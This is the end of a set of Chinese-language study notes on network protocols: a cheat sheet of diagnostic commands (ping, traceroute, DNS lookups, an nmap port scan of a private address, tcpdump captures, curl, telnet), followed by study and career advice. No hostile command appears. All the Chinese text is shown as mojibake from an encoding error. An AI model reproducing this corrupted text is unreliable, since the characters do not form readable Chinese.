**ç½‘ç»œè¯Šæ–­å‘½ä»¤**:
```bash
# æµ‹è¯•è¿é€šæ€§
ping www.baidu.com

# è·¯ç”±è¿½è¸ª
traceroute www.google.com  # Linux/Mac
tracert www.google.com     # Windows

# DNSæŸ¥è¯¢
nslookup www.baidu.com
dig www.google.com         # Linux/Mac

# ç«¯å£æ‰«æ
nmap -p 1-1000 192.168.1.1

# æŸ¥çœ‹ç½‘ç»œæ¥å£
ifconfig                    # Linux/Mac
ipconfig                    # Windows

# æŸ¥çœ‹è·¯ç”±è¡¨
route -n                    # Linux
route print                 # Windows

# æŸ¥çœ‹ARPç¼“å­˜
arp -a

# æŸ¥çœ‹ç½‘ç»œè¿æ¥
netstat -tuln              # Linux
netstat -ano               # Windows

# æŠ“åŒ…
tcpdump -i eth0 port 80
tcpdump -i eth0 -w capture.pcap
```

**åè®®æµ‹è¯•å‘½ä»¤**:
```bash
# HTTPè¯·æ±‚
curl -v http://www.baidu.com
wget http://example.com/file.txt

# Telnetæµ‹è¯•ç«¯å£
telnet www.baidu.com 80

# æµ‹è¯•SMTP
telnet smtp.gmail.com 25

# WebSocketæµ‹è¯•
wscat -c ws://localhost:8080
```

### D. ä¸‹ä¸€æ­¥å­¦ä¹ å»ºè®®

**åŸºç¡€å·©å›ºæ–¹å‘**:
1. æ·±å…¥å­¦ä¹ TCP/IPåè®®æ ˆçš„å®Œæ•´å®ç°
2. ç ”ç©¶Linuxå†…æ ¸ç½‘ç»œå­ç³»ç»Ÿæºç 
3. å­¦ä¹ ç½‘ç»œç¼–ç¨‹æ¨¡å‹ï¼ˆselectã€pollã€epollã€io_uringï¼‰
4. æŒæ¡ç½‘ç»œæ€§èƒ½ä¼˜åŒ–æŠ€æœ¯

**è¿›é˜¶å‘å±•æ–¹å‘**:
1. **ç½‘ç»œå®‰å…¨**: TLS/SSLã€IPSecã€é˜²ç«å¢™ã€IDS/IPS
2. **ç°ä»£åè®®**: HTTP/2ã€HTTP/3ã€QUICã€gRPC
3. **åˆ†å¸ƒå¼ç³»ç»Ÿ**: Raftã€Paxosã€Gossipåè®®
4. **å®æ—¶é€šä¿¡**: WebRTCã€SIPã€RTP/RTCP
5. **IoTåè®®**: MQTTã€CoAPã€LoRaWANã€Zigbee
6. **å®¹å™¨ç½‘ç»œ**: Dockerç½‘ç»œã€Kubernetes CNI
7. **SDN**: OpenFlowã€P4

**èŒä¸šå‘å±•è·¯å¾„**:
1. **ç½‘ç»œå·¥ç¨‹å¸ˆ**: ç½‘ç»œæ¶æ„ã€è¿ç»´ã€ä¼˜åŒ–
2. **åè®®å¼€å‘å·¥ç¨‹å¸ˆ**: åè®®è®¾è®¡ã€å®ç°ã€æµ‹è¯•
3. **ç½‘ç»œå®‰å…¨å·¥ç¨‹å¸ˆ**: å®‰å…¨åˆ†æã€æ¸—é€æµ‹è¯•
4. **å…¨æ ˆå¼€å‘å·¥ç¨‹å¸ˆ**: Webåº”ç”¨ã€APIè®¾è®¡
5. **IoTå·¥ç¨‹å¸ˆ**: ç‰©è”ç½‘ç³»ç»Ÿè®¾è®¡ä¸å¼€å‘

---

## å­¦ä¹ ç¬”è®°æ€»ç»“

æœ¬å­¦ä¹ ç¬”è®°æ¶µç›–äº†ç½‘ç»œåè®®çš„æ ¸å¿ƒçŸ¥è¯†ç‚¹ï¼Œä»åŸºç¡€æ¦‚å¿µåˆ°å®æˆ˜åº”ç”¨ï¼Œæä¾›äº†å®Œæ•´çš„å­¦ä¹ è·¯å¾„ã€‚

### âœ… å·²æŒæ¡çš„æ ¸å¿ƒå†…å®¹

**åè®®åŸºç¡€**:
- ç½‘ç»œåè®®ä¸‰è¦ç´ ï¼ˆè¯­æ³•ã€è¯­ä¹‰ã€æ—¶åºï¼‰
- OSIä¸ƒå±‚æ¨¡å‹ä¸TCP/IPå››å±‚æ¨¡å‹
- æ•°æ®å°è£…ä¸è§£å°è£…è¿‡ç¨‹

**ç‰©ç†å±‚ä¸æ•°æ®é“¾è·¯å±‚**:
- Ethernetå¸§ç»“æ„ä¸CSMA/CDæœºåˆ¶
- Wi-Fiåè®®æ—ä¸802.11æ ‡å‡†
- MACåœ°å€ä¸VLANæŠ€æœ¯

**ç½‘ç»œå±‚**:
- IPv4/IPv6æ•°æ®åŒ…æ ¼å¼ä¸åœ°å€åˆ†ç±»
- ICMPåè®®ï¼ˆpingã€tracerouteåŸç†ï¼‰
- ARPåè®®ä¸åœ°å€è§£ææœºåˆ¶

**ä¼ è¾“å±‚**:
- TCPä¸‰æ¬¡æ¡æ‰‹ä¸å››æ¬¡æŒ¥æ‰‹
- TCPæµé‡æ§åˆ¶ä¸æ‹¥å¡æ§åˆ¶
- UDPç‰¹ç‚¹ä¸åº”ç”¨åœºæ™¯

**åº”ç”¨å±‚**:
- HTTP/HTTPSåè®®è¯¦è§£
- WebSocketå…¨åŒå·¥é€šä¿¡
- DNSåŸŸåè§£æç³»ç»Ÿ
- Telnetè¿œç¨‹ç™»å½•åè®®

**IoTåè®®** (è¯¦è§`protocol_iot.md`):
- MQTTå‘å¸ƒ/è®¢é˜…æ¨¡å¼
- CoAPè½»é‡çº§åè®®
- CANæ€»çº¿åè®®
- Bluetoothä½åŠŸè€—é€šä¿¡

### âœ… å®æˆ˜èƒ½åŠ›

- ä½¿ç”¨Pythonå®ç°å„å±‚åè®®
- æ„å»ºå’Œè§£æè‡ªå®šä¹‰åè®®
- åè®®å®‰å…¨å¢å¼ºå®ç°
- ç½‘ç»œé—®é¢˜è¯Šæ–­ä¸æ’æŸ¥
- åè®®æŠ“åŒ…åˆ†æ

### ğŸ“š æŒç»­å­¦ä¹ å»ºè®®

1. **æ·±å…¥ç ”ç©¶**: é˜…è¯»RFCæ–‡æ¡£ï¼Œäº†è§£åè®®çš„è®¾è®¡å“²å­¦
2. **åŠ¨æ‰‹å®è·µ**: å®ç°æ›´å¤šåè®®ï¼ŒåŠ æ·±ç†è§£
3. **æºç é˜…è¯»**: ç ”ç©¶ä¼˜ç§€ç½‘ç»œåº“çš„å®ç°
4. **å…³æ³¨æ–°æŠ€æœ¯**: HTTP/3ã€QUICã€eBPFç­‰æ–°å…´æŠ€æœ¯
5. **å®‰å…¨æ„è¯†**: å­¦ä¹ ç½‘ç»œå®‰å…¨ï¼Œäº†è§£æ”»é˜²æŠ€æœ¯

### ğŸ¯ æœ€åçš„å»ºè®®

ç½‘ç»œåè®®å­¦ä¹ éœ€è¦ç†è®ºä¸å®è·µç›¸ç»“åˆï¼š

1. **ç†è®ºå­¦ä¹ **: ç³»ç»Ÿå­¦ä¹ åè®®è§„èŒƒï¼Œç†è§£è®¾è®¡åŸç†
2. **å®è·µéªŒè¯**: é€šè¿‡ç¼–ç¨‹å®ç°åè®®ï¼ŒéªŒè¯ç†è§£
3. **å·¥å…·ä½¿ç”¨**: ç†Ÿç»ƒä½¿ç”¨Wiresharkç­‰å·¥å…·åˆ†ææµé‡
4. **é—®é¢˜æ’æŸ¥**: ç§¯ç´¯ç½‘ç»œé—®é¢˜è¯Šæ–­ç»éªŒ
5. **æŒç»­æ›´æ–°**: å…³æ³¨æŠ€æœ¯å‘å±•ï¼Œå­¦ä¹ æ–°åè®®

**è®°ä½**: åè®®æ˜¯ç½‘ç»œé€šä¿¡çš„åŸºçŸ³ï¼Œæ·±å…¥ç†è§£åè®®èƒ½è®©ä½ åœ¨ç½‘ç»œç¼–ç¨‹ã€ç³»ç»Ÿè®¾è®¡ã€é—®é¢˜æ’æŸ¥ç­‰æ–¹é¢æ¸¸åˆƒæœ‰ä½™ï¼

---

**æ–‡æ¡£ç‰ˆæœ¬**: v2.0
**æœ€åæ›´æ–°**: 2025-11
**ä½œè€…**: æŠ€æœ¯å­¦ä¹ ç¬”è®°ç”Ÿæˆä¸“å®¶
**ç›¸å…³æ–‡æ¡£**: [IoTåè®®è¯¦è§£](protocol_iot.md)

